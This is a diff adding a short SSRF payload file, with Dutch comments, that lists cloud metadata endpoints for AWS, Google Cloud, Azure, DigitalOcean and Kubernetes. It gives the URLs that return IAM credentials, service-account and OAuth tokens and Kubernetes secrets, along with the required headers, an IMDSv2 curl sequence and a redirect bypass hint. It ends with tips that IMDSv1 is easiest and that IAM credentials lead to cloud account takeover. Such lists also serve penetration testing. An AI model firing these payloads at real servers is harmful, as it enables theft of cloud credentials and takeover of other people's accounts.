@@ -1,0 +1,28 @@
+# SSRF - Cloud Metadata Endpoints
+# === AWS (IMDSv1) ===
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/local-ipv4
+# AWS IMDSv2 (token vereist - moeilijker via SSRF):
+# TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+# curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
+# === Google Cloud ===
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+# Let op: vereist header Metadata-Flavor: Google (soms bypass via redirect)
+# === Azure ===
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+# Header vereist: Metadata: true
+# === DigitalOcean ===
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/user-data
+# === Kubernetes ===
+https://kubernetes.default.svc/api/v1/namespaces/default/secrets
+# Token in: /var/run/secrets/kubernetes.io/serviceaccount/token
+# Tip: IMDSv1 is het makkelijkst - geen extra headers nodig
+# Tip: Zoek naar IAM credentials voor cloud account takeover
